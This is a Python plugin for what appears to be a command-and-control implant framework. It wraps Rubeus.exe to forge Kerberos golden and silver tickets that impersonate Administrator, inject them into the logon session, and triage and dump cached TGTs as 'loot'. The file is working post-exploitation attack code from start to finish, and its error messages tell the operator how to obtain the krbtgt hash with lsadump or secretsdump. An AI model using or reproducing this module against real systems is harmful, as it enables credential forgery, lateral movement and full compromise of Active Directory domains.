"""lateral_movement/ticket_manipulation — Kerberos ticket forging via Rubeus.exe. MITRE T1558.

Dispatches Rubeus.exe on the implant host. Rubeus must be present on target or
dropped first via the file_upload plugin. Common drop paths checked automatically.

References: GhostPack/Rubeus (DEF CON 26 / BHUSA), harmj0y Kerberoasting research.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema

_RUBEUS_PROBE = r"""
$rub = $null
foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
    if (Test-Path $p) { $rub = $p; break }
}
if (-not $rub) {
    $cmd = Get-Command Rubeus.exe -ErrorAction SilentlyContinue
    if ($cmd) { $rub = $cmd.Source }
}
if (-not $rub) { Write-Output '[-] Rubeus.exe not found — upload it first (file_upload plugin)'; exit 1 }
Write-Output $rub
"""


class TicketManipulation(BasePlugin):
    NAME        = "ticket_manipulation"
    DESCRIPTION = "Kerberos golden/silver ticket forging and triage via Rubeus.exe (T1558)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1558"
    CATEGORY    = "lateral_movement"

    schema = ParamSchema().add(
        Param("ticket_type", str, required=True,
              help="golden_ticket | silver_ticket | triage | purge | dump"),
        Param("username",    str, required=False, default="Administrator",
              help="User to impersonate"),
        Param("domain",      str, required=False, default="",
              help="Domain FQDN (auto-enumerated if blank)"),
        Param("domain_sid",  str, required=False, default="",
              help="Domain SID S-1-5-21-... (auto-enumerated if blank)"),
        Param("krbtgt_hash", str, required=False, default="",
              help="krbtgt RC4/NTLM hash for golden ticket"),
        Param("service_key", str, required=False, default="",
              help="Service account RC4/NTLM hash for silver ticket"),
        Param("service",     str, required=False, default="",
              help="Service SPN for silver ticket (e.g. cifs/dc.domain.com)"),
        Param("ptt",         bool, required=False, default=True,
              help="Pass-the-ticket — inject into current logon session"),
        Param("outfile",     str, required=False, default="",
              help="Write .kirbi to this path instead of /ptt"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        ticket_type = params.get("ticket_type", "").lower()
        if ticket_type == "golden_ticket":
            return self._golden(ctx, params)
        if ticket_type == "silver_ticket":
            return self._silver(ctx, params)
        if ticket_type == "triage":
            return self._triage(ctx)
        if ticket_type == "purge":
            return self._purge(ctx)
        if ticket_type == "dump":
            return self._dump(ctx)
        return ModuleResult.err(f"Unknown ticket_type: {ticket_type}. "
                                "Use: golden_ticket | silver_ticket | triage | purge | dump")

    # ── helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _resolve_domain(ctx) -> tuple[str, str]:
        """Return (domain_fqdn, domain_sid) from the current domain."""
        ps = r"""
$dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$fqdn = $dom.Name
try {
    $obj = New-Object System.Security.Principal.NTAccount($fqdn, 'Domain Admins')
    $fullSid = $obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
    $parts = $fullSid -split '-'
    $domSid = ($parts[0..($parts.Length-2)]) -join '-'
} catch { $domSid = '' }
Write-Output "$fqdn|$domSid"
"""
        r = ctx.ps(ps)
        if r.get("status") == "ok":
            parts = (r.get("output") or "").strip().split("|", 1)
            if len(parts) == 2:
                return parts[0].strip(), parts[1].strip()
        return "", ""

    # ── golden ticket ─────────────────────────────────────────────────────────

    def _golden(self, ctx, params) -> ModuleResult:
        username    = params.get("username", "Administrator")
        domain      = params.get("domain", "").strip()
        domain_sid  = params.get("domain_sid", "").strip()
        krbtgt_hash = params.get("krbtgt_hash", "").strip()
        ptt         = params.get("ptt", True)
        outfile     = params.get("outfile", "").strip()

        if not krbtgt_hash:
            return ModuleResult.err(
                "krbtgt_hash required — obtain with: dump_sam method=lsadump or secretsdump.py"
            )

        if not domain or not domain_sid:
            d_fqdn, d_sid = self._resolve_domain(ctx)
            domain     = domain     or d_fqdn
            domain_sid = domain_sid or d_sid

        if not domain_sid:
            return ModuleResult.err(
                "domain_sid required — pass as S-1-5-21-... or ensure DC connectivity"
            )

        ptt_flag = "/ptt" if ptt else (f"/outfile:{outfile}" if outfile else "/ptt")
        dom_flag = f"/domain:{domain}" if domain else ""

        ps = f"""
$rub = $null
foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
    if (Test-Path $p) {{ $rub = $p; break }}
}}
if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
if (-not $rub) {{ Write-Output '[-] Rubeus.exe not found — upload via file_upload first'; exit }}
& $rub golden /rc4:{krbtgt_hash} /user:{username} {dom_flag} /sid:{domain_sid} {ptt_flag} 2>&1
"""
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"Rubeus golden failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket")

    # ── silver ticket ─────────────────────────────────────────────────────────

    def _silver(self, ctx, params) -> ModuleResult:
        username    = params.get("username", "Administrator")
        domain      = params.get("domain", "").strip()
        domain_sid  = params.get("domain_sid", "").strip()
        service_key = params.get("service_key", "").strip()
        service     = params.get("service", "").strip()
        ptt         = params.get("ptt", True)
        outfile     = params.get("outfile", "").strip()

        if not service_key:
            return ModuleResult.err(
                "service_key required — service account NTLM hash "
                "(e.g. computer$ account for cifs/host services)"
            )
        if not service:
            return ModuleResult.err("service SPN required (e.g. cifs/dc.domain.com)")

        if not domain or not domain_sid:
            d_fqdn, d_sid = self._resolve_domain(ctx)
            domain     = domain     or d_fqdn
            domain_sid = domain_sid or d_sid

        ptt_flag = "/ptt" if ptt else (f"/outfile:{outfile}" if outfile else "/ptt")
        dom_flag = f"/domain:{domain}" if domain else ""
        sid_flag = f"/sid:{domain_sid}" if domain_sid else ""

        ps = f"""
$rub = $null
foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
    if (Test-Path $p) {{ $rub = $p; break }}
}}
if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
if (-not $rub) {{ Write-Output '[-] Rubeus.exe not found — upload via file_upload first'; exit }}
& $rub silver /rc4:{service_key} /user:{username} /service:{service} {dom_flag} {sid_flag} {ptt_flag} 2>&1
"""
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"Rubeus silver failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="silver_ticket")

    # ── triage / purge / dump ─────────────────────────────────────────────────

    @staticmethod
    def _triage(ctx) -> ModuleResult:
        """List all cached Kerberos tickets in every accessible logon session."""
        ps = r"""
$rub = $null
foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
    if (Test-Path $p) { $rub = $p; break }
}
if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
if (-not $rub) { Write-Output '[-] Rubeus.exe not found'; exit }
& $rub triage 2>&1
"""
        r = ctx.ps(ps)
        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_triage")

    @staticmethod
    def _purge(ctx) -> ModuleResult:
        """Purge all Kerberos tickets from the current logon session."""
        r = ctx.exec("klist purge")
        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_purge")

    @staticmethod
    def _dump(ctx) -> ModuleResult:
        """Dump all TGTs from all accessible logon sessions via Rubeus dump."""
        ps = r"""
$rub = $null
foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
    if (Test-Path $p) { $rub = $p; break }
}
if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
if (-not $rub) { Write-Output '[-] Rubeus.exe not found'; exit }
& $rub dump /nowrap 2>&1
"""
        r = ctx.ps(ps)
        return ModuleResult.ok(data=r.get("output", ""), loot_kind="ticket_dump")
